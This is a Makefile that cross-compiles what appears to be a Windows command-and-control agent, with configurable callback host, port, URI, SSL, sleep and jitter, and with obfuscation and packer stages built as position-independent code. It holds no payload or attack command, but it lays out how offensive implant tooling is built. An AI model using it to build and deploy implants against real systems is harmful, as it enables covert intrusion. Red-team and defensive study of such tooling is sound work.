.PHONY: x64 x64-debug clean

CC := x86_64-w64-mingw32-gcc
CFLAGS := -w -Os -c -shared -masm=intel -fno-toplevel-reorder -fno-jump-tables -mno-stack-arg-probe -ISource/includes

BUILD_PATH ?= .
OBJ_PATH := $(BUILD_PATH)/Bin/obj

DEFS :=
ifdef MV_AGENT_UUID
DEFS += -DMV_AGENT_UUID=\"$(MV_AGENT_UUID)\"
endif
ifdef MV_SLEEP_TIME
DEFS += -DMV_SLEEP_TIME=$(MV_SLEEP_TIME)
endif
ifdef MV_JITTER
DEFS += -DMV_JITTER=$(MV_JITTER)
endif
ifdef MV_CALLBACK_HOST
DEFS += -DMV_CALLBACK_HOST=\"$(MV_CALLBACK_HOST)\"
endif
ifdef MV_CALLBACK_PORT
DEFS += -DMV_CALLBACK_PORT=$(MV_CALLBACK_PORT)
endif
ifdef MV_CALLBACK_URI
DEFS += -DMV_CALLBACK_URI=\"$(MV_CALLBACK_URI)\"
endif
ifdef MV_CALLBACK_SSL
DEFS += -DMV_CALLBACK_SSL=$(MV_CALLBACK_SSL)
endif

CORE_OBJS := $(OBJ_PATH)/main.x64.o

PICO_OBJS := $(OBJ_PATH)/entry.x64.o \
             $(OBJ_PATH)/crypto.x64.o \
             $(OBJ_PATH)/packer.x64.o \
             $(OBJ_PATH)/transport.x64.o \
             $(OBJ_PATH)/tasks.x64.o \
             $(OBJ_PATH)/obfuscation.x64.o

$(OBJ_PATH)/transport.x64.o: Source/transport.c
	@mkdir -p $(dir $@)
	$(CC) $(CFLAGS) $(DEFS) -Ilib/LibWinHttp/src -o $@ $<

$(OBJ_PATH)/%.x64.o: Source/%.c
	@mkdir -p $(dir $@)
	$(CC) $(CFLAGS) $(DEFS) -o $@ $<

x64: $(CORE_OBJS) $(PICO_OBJS)

x64-debug: CFLAGS += -DMV_DEBUG
x64-debug: $(CORE_OBJS) $(PICO_OBJS)

clean:
	@rm -rf $(OBJ_PATH)
	@rm -f $(BUILD_PATH)/Bin/*.bin
